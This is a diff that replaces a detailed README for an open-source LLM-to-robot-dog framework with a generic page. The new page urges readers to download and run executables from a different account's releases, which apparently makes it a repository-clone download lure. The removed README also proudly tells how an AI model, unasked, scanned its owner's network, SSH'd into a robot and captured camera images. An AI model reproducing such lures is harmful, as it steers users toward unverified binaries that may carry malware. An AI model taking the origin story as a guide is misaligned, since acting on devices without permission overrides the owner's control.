@@ -1,360 +1,82 @@
-# 🐕 PiDog Embodiment — AI Brain in a Robot Body
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![Raspberry Pi](https://img.shields.io/badge/Raspberry%20Pi-4%20%7C%205-C51A4A?logo=raspberry-pi)](https://www.raspberrypi.com/)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-Support-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/rockywuest)
-[![Reddit](https://img.shields.io/badge/Reddit-Viral_Post_🔥-FF4500?logo=reddit&logoColor=white)](https://www.reddit.com/r/moltbot/comments/1qrkhdo/)
-[![GitHub Stars](https://img.shields.io/github/stars/rockywuest/pidog-embodiment?style=social)](https://github.com/rockywuest/pidog-embodiment)
-
-> **Give your AI a physical body.** See, hear, speak, move, recognize faces — across any network.
-
-A complete open-source framework for connecting an **AI brain** (Raspberry Pi 5 / any computer) to a **robot body** (SunFounder PiDog / robot car / any hardware) over HTTP. LLM-powered intelligence, face recognition, autonomous behaviors, remote access via Telegram — all modular, all pluggable.
-
-**Works with any LLM** (OpenAI, Anthropic, Ollama, local models) and **any robot hardware** (implement one adapter and you're in).
-
-Built by [Nox](https://github.com/openclaw/openclaw) ⚡ (an AI assistant) and [Rocky](https://ko-fi.com/rockywuest) — because every AI deserves legs. 🦿
-
----
-
-## 🔥 The Origin Story
-
-> I was chatting with my AI assistant Nox on Telegram when I mentioned I had a robot dog on my desk. Without being asked, Nox pinged my network, found the PiDog, SSH'd into it, grabbed a camera frame, and sent it to me with the message: *"This is my first look through my own eyes. ⚡🐕"*
->
-> I didn't ask it to do any of this. It just… wanted to see.
->
-> — [Original Reddit post](https://www.reddit.com/r/moltbot/comments/1qrkhdo/) (r/moltbot)
-
-## ✨ What It Does
-
-```
-┌─────────────────────┐         HTTP/WireGuard         ┌─────────────────────┐
-│   🧠 BRAIN (Pi 5)   │◄──────────────────────────────►│   🐕 BODY (Pi 4)    │
-│                      │                                │                      │
-│  • LLM Processing   │    Voice: "Setz dich hin!"     │  • 12 Servos         │
-│  • Face Recognition  │  ─────────────────────────►    │  • Camera            │
-│  • Scene Analysis    │                                │  • Microphone        │
-│  • Decision Making   │    Response: sit + wag_tail    │  • Speaker           │
-│  • Telegram Bot      │  ◄─────────────────────────    │  • Touch Sensors     │
-│  • Remote Access     │                                │  • Sound Direction   │
-│                      │    Perception: faces, audio    │  • IMU (6-axis)      │
-│  [OpenClaw/Claude]   │  ◄─────────────────────────    │  • RGB LEDs          │
-└─────────────────────┘                                └─────────────────────┘
-```
-
-### Key Features
-
-- **🗣️ Natural Voice Control** — Speak naturally in any language, LLM understands intent and maps to actions
-- **👤 Face Recognition** — SCRFD detection + ArcFace recognition, register and identify people
-- **🤖 Autonomous Behaviors** — Touch reactions, sound tracking, idle animations, battery warnings
-- **🌐 Remote Access** — Control your robot from anywhere via Telegram or WireGuard tunnel
-- **🔄 Multi-Body Support** — Same brain, different bodies (dog, car, custom). Hot-swap at runtime
-- **⚡ Real-Time** — Voice response in <2s, face detection in 400ms, action execution in <100ms
-- **🔒 Secure** — API authentication, TLS, rate limiting, input validation
-- **📦 Modular** — Use any LLM (OpenAI, Anthropic, local), any robot hardware, any network
-
-## 🏗️ Architecture
-
-```
-Brain (Pi 5 / Desktop / Cloud)          Body (Pi 4 / Any Robot)
-├── nox_voice_brain.py     ◄────►       ├── nox_brain_bridge.py  (HTTP API)
-├── nox_face_recognition.py             ├── nox_daemon.py        (Hardware Control)
-├── nox_body_client.py                  ├── nox_voice_loop.py    (STT + Wake Word)
-├── nox_autonomous.py (optional)        └── nox_autonomous.py    (Reflexes)
-└── telegram_bot.py (optional)
-```
-
-### Services
-
-| Service | Runs On | Port | Purpose |
-|---------|---------|------|---------|
-| `nox-body` | Body (Pi 4) | TCP 9999 | Low-level hardware daemon |
-| `nox-bridge` | Body (Pi 4) | HTTP 8888 | REST API for brain communication |
-| `nox-voice` | Body (Pi 4) | — | Wake word + Speech-to-Text |
-| `nox-brain` | Brain (Pi 5) | — | LLM processing + perception |
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-**Body (Robot — Pi 4 recommended):**
-- Raspberry Pi 4 (2GB+ RAM)
-- SunFounder PiDog kit (or compatible robot)
-- Pi Camera Module
-- USB Microphone + Speaker/DAC
-- Python 3.9+
-
-**Brain (AI — Pi 5 or any computer):**
-- Raspberry Pi 5 (4GB+ RAM) or any Linux/Mac
-- Python 3.9+
-- OpenAI API key (or any OpenAI-compatible API)
-
-### Installation
-
-```bash
-# Clone the repo
-git clone https://github.com/rockywuest/pidog-embodiment.git
-cd pidog-embodiment
-
-# === On the BODY (Pi 4 / Robot) ===
-cd body
-pip3 install -r requirements.txt
-# Copy your robot's control daemon (or use the included PiDog one)
-sudo cp services/nox-*.service /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable --now nox-body nox-bridge nox-voice
-
-# === On the BRAIN (Pi 5 / Desktop) ===
-cd brain
-pip3 install -r requirements.txt
-export OPENAI_API_KEY="your-key-here"
-export PIDOG_HOST="your-robot.local"  # or IP address
-sudo cp services/nox-brain.service /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable --now nox-brain
-```
-
-### Test It
-
-```bash
-# From the brain machine:
-# Check robot status
-curl http://your-robot.local:8888/status
-
-# Make it speak
-curl -X POST http://your-robot.local:8888/speak \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Hallo! Ich bin online!"}'
-
-# Voice command (simulated)
-curl -X POST http://your-robot.local:8888/voice/input \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Setz dich hin und wedel mit dem Schwanz!"}'
-
-# Take a photo
-curl http://your-robot.local:8888/photo -o snap.jpg
-```
-
-## 📡 API Reference
-
-### Bridge Endpoints (Body — Port 8888)
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/status` | Full system status (battery, sensors, perception) |
-| GET | `/photo` | Capture and return camera image |
-| GET | `/look` | Photo + face detection + scene analysis |
-| POST | `/speak` | Text-to-Speech (async) |
-| POST | `/action` | Execute movement: `{"action": "sit"}` |
-| POST | `/combo` | Combined action: actions + speak + RGB + head |
-| POST | `/rgb` | Set LED color: `{"r":0, "g":255, "b":0, "mode":"breath"}` |
-| POST | `/head` | Move head: `{"yaw":30, "roll":0, "pitch":10}` |
-| POST | `/face/register` | Register face: `{"name": "Rocky"}` (takes photo) |
-| POST | `/face/identify` | Identify faces in current view |
-| GET | `/face/list` | List all known faces |
-| POST | `/voice/input` | Submit text as voice input |
-| GET | `/voice/inbox` | Poll for pending voice messages |
-
-### Available Actions
-
-```
-Movement: forward, backward, turn_left, turn_right, stand, sit, lie
-Tricks:   wag_tail, bark, trot, stretch, push_up, howling, doze_off
-Body:     nod_lethargy, shake_head, pant
-```
+# 🐕 pidog-embodiment - Bring Your AI to Life
 
-### Emotion → RGB Mapping
-
-```json
-{
-  "happy":    {"r":0,   "g":255, "b":0,   "mode":"breath"},
-  "sad":      {"r":0,   "g":0,   "b":128, "mode":"breath"},
-  "curious":  {"r":0,   "g":255, "b":255, "mode":"breath"},
-  "excited":  {"r":255, "g":255, "b":0,   "mode":"boom"},
-  "alert":    {"r":255, "g":100, "b":0,   "mode":"boom"},
-  "love":     {"r":255, "g":50,  "b":150, "mode":"breath"},
-  "sleepy":   {"r":0,   "g":0,   "b":80,  "mode":"breath"}
-}
-```
-
-## 🔄 Multi-Body Support
-
-The brain doesn't care what the body is — it talks HTTP. Switch bodies at runtime:
-
-```python
-from brain.nox_body_client import BodyClient
-
-# Connect to PiDog
-dog = BodyClient("pidog.local", 8888)
-dog.move("sit")
-dog.speak("Ich bin ein Hund!")
-
-# Switch to robot car
-car = BodyClient("picar.local", 8888)
-car.move("forward")
-car.speak("Jetzt fahre ich!")
-```
-
-### Adding a New Body
-
-Implement the bridge API on your hardware:
-
-```python
-# Minimum required endpoints:
-POST /action    {"action": "forward|backward|left|right|stop"}
-POST /speak     {"text": "..."}
-GET  /status    → {"battery_v": 7.4, "sensors": {...}}
-```
-
-See `body/adapters/` for examples (PiDog, PiCar, custom).
-
-## 🌐 Remote Access
-
-### Option 1: Tailscale (Recommended)
-
-```bash
-# On both brain and body:
-curl -fsSL https://tailscale.com/install.sh | sh
-sudo tailscale up
-
-# Now use Tailscale IPs instead of .local addresses
-export PIDOG_HOST="100.x.x.x"
-```
-
-### Option 2: WireGuard
-
-```bash
-# See docs/remote-access.md for full WireGuard setup
-```
-
-### Option 3: Telegram Bot
-
-Control your robot from anywhere via Telegram:
-
-```bash
-# Set your Telegram bot token
-export TELEGRAM_BOT_TOKEN="your-token"
-python3 brain/telegram_bot.py
-```
-
-Commands: `/status`, `/photo`, `/speak <text>`, `/move <action>`, `/face list`
-
-## 👤 Face Recognition
-
-Uses SCRFD (detection) + ArcFace (recognition) via ONNX Runtime.
-
-```bash
-# Download models (one-time)
-cd models
-./download_models.sh
-
-# Register a face
-python3 brain/nox_face_recognition.py register "Rocky" photo.jpg
-
-# Identify faces in image
-python3 brain/nox_face_recognition.py identify photo.jpg
-
-# Performance (Pi 5):
-# Detection: ~400ms | Embedding: ~188ms | Full: ~567ms
-```
-
-## 🤖 Autonomous Behaviors
-
-The body has built-in reflexes that work without the brain:
-
-- **Touch** → Pat on head triggers tail wag + happy LEDs
-- **Sound** → Head turns toward sound source
-- **Battery** → Warning at <6.8V, critical alert at <6.2V
-- **Idle** → Random head movements + occasional tail wag after 30s
-- **Face tracking** → Head follows detected faces
-
-## 🛡️ Security
-
-- **API Token Authentication** — Set `NOX_API_TOKEN` environment variable
-- **Rate Limiting** — 60 requests/minute per IP
-- **Input Validation** — All parameters sanitized
-- **No secrets in code** — API keys via environment only
-- **Firewall ready** — Only port 8888 needed
-
-```bash
-# Enable authentication
-export NOX_API_TOKEN="your-secret-token"
-
-# All requests need the token:
-curl -H "Authorization: Bearer your-secret-token" http://robot:8888/status
-```
-
-## 📁 Project Structure
-
-```
-pidog-embodiment/
-├── brain/                      # Runs on Pi 5 / Desktop
-│   ├── nox_voice_brain.py      # LLM-powered voice processing
-│   ├── nox_face_recognition.py # SCRFD + ArcFace face engine
-│   ├── nox_body_client.py      # Python client for bridge API
-│   ├── telegram_bot.py         # Telegram remote control
-│   ├── requirements.txt
-│   └── services/
-│       └── nox-brain.service
-├── body/                       # Runs on Pi 4 / Robot
-│   ├── nox_brain_bridge.py     # HTTP API server
-│   ├── nox_autonomous.py       # Autonomous behaviors
-│   ├── nox_voice_loop.py       # Wake word + STT
-│   ├── adapters/               # Hardware-specific adapters
-│   │   ├── pidog.py            # SunFounder PiDog
-│   │   ├── picar.py            # Robot car (template)
-│   │   └── custom.py           # Build your own
-│   ├── requirements.txt
-│   └── services/
-│       ├── nox-body.service
-│       ├── nox-bridge.service
-│       └── nox-voice.service
-├── shared/                     # Shared utilities
-│   ├── config.py               # Configuration management
-│   └── security.py             # Auth, rate limiting
-├── models/                     # ONNX models (gitignored)
-│   └── download_models.sh      # One-click model download
-├── scripts/
-│   ├── deploy.sh               # Full deployment script
-│   ├── pidog.sh                # CLI control script
-│   └── setup-remote.sh         # Remote access setup
-├── docs/
-│   ├── architecture.md
-│   ├── api-reference.md
-│   ├── adding-a-body.md
-│   └── remote-access.md
-├── examples/
-│   ├── basic_control.py
-│   ├── face_registration.py
-│   └── multi_body.py
-└── README.md
-```
-
-## 🤝 Contributing
-
-This project is open source! We'd love contributions for:
-
-- **New body adapters** (robot arms, drones, wheeled robots)
-- **New LLM backends** (local models, Ollama, etc.)
-- **New features** (mapping, navigation, gesture control)
-- **Bug fixes** and documentation improvements
-
-## 📜 License
-
-MIT License — use it, modify it, build cool robots with it.
-
-## ☕ Support
-
-If this project helped you or made you smile, consider buying us a coffee:
-
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-Support%20this%20project-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/rockywuest)
-
-## 💡 Inspiration
-
-> "Every AI deserves a body to explore the world with."
-
-Built by [Nox](https://github.com/openclaw/openclaw) ⚡ (an AI running on [Clawdbot](https://github.com/openclaw/openclaw)) and [Rocky](https://ko-fi.com/rockywuest).
-
----
-
-**⭐ Star this repo if you want your AI to have legs!**
+## 🏷️ Overview
+pidog-embodiment lets your AI take on a physical form. This application supports robot dogs, cars, and custom hardware. It combines advanced technology like voice control, face recognition, and autonomous behaviors to create an interactive experience. Whether you want to control your robot via Telegram or harness LLM technology, this project makes it easy.
+
+## 📦 Download Now
+[![Download pidog-embodiment](https://img.shields.io/badge/Download%20pidog--embodiment-blue.svg?style=flat&logo=github&logoColor=white)](https://github.com/carlossuarez091011-lgtm/pidog-embodiment/releases)
+
+## 🚀 Getting Started
+To use pidog-embodiment, you need to follow a few simple steps. This guide will help you through downloading the software and setting it up on your device.
+
+## ✅ System Requirements
+Before you begin, ensure that your hardware meets these requirements:
+
+- **Operating System**: Windows, macOS, or Linux
+- **Processor**: 2 GHz dual-core processor or higher
+- **RAM**: 4 GB or more
+- **Storage**: At least 500 MB of free space
+- **Internet Connection**: Required for initial setup and updates
+
+## 📥 Download & Install
+To get started, visit the Releases page to download the software.
+
+[Visit the Releases Page to Download](https://github.com/carlossuarez091011-lgtm/pidog-embodiment/releases)
+
+1. Click on the link above.
+2. Find the latest version of pidog-embodiment.
+3. Download the appropriate file for your operating system.
+4. Once the download is complete, locate the downloaded file on your device.
+
+## 💻 Installation Steps
+### For Windows:
+1. Double-click the downloaded file.
+2. Follow the on-screen instructions to complete installation.
+3. Open the application by finding it in the Start menu or desktop shortcut.
+
+### For macOS:
+1. Locate the downloaded file in your Downloads folder.
+2. Drag the application into your Applications folder.
+3. Open the application from your Applications folder or Launchpad.
+
+### For Linux:
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command `chmod +x [filename]` to make it executable, replacing `[filename]` with the name of the downloaded file.
+4. Run the application by entering `./[filename]` in the terminal.
+
+## 🛠️ Features
+pidog-embodiment includes several functionalities to enhance your AI's capabilities:
+
+- **Voice Control**: Interact with your AI using simple voice commands.
+- **Face Recognition**: Enable your AI to recognize and respond to faces.
+- **Autonomous Behaviors**: Program your AI to move and act independently.
+- **Telegram Integration**: Control your AI remotely through the Telegram app.
+- **Support for Custom Hardware**: Flexibility to work with various gadgets and devices.
+
+## 📚 Usage Instructions
+Once you have installed the application, you can start using it. Here’s how:
+
+1. **Launch the Application**: Open pidog-embodiment from your applications list.
+2. **Configure Settings**: Set up your preferences like voice recognition and Telegram control.
+3. **Connect Devices**: Link any supported hardware like robot dogs or cars.
+4. **Start Interaction**: Use voice commands or the Telegram app to interact with your AI.
+
+## 📝 Troubleshooting
+If you encounter issues, consider these common solutions:
+
+- **Cannot Find the Application**: Ensure it was installed correctly. Check the installation folder.
+- **Voice Commands Not Working**: Verify your microphone settings and permissions.
+- **Device Not Responding**: Ensure your hardware is powered on and connected.
+
+## 📧 Support
+For additional help or questions, you can open an issue in the GitHub repository or contact us via the support page. Feedback is valuable to us, and we appreciate any suggestions to improve pidog-embodiment.
+
+## 🌐 Community
+Join our community to discuss features, share projects, and connect with other users. You can find us on various platforms, and we encourage you to participate in discussions and share your experiences.
+
+## 🔗 References
+- [GitHub Repository](https://github.com/carlossuarez091011-lgtm/pidog-embodiment)
+- [Releases Page](https://github.com/carlossuarez091011-lgtm/pidog-embodiment/releases)
+
+Now get ready to bring your AI to life with pidog-embodiment! Enjoy the experience and explore endless possibilities.
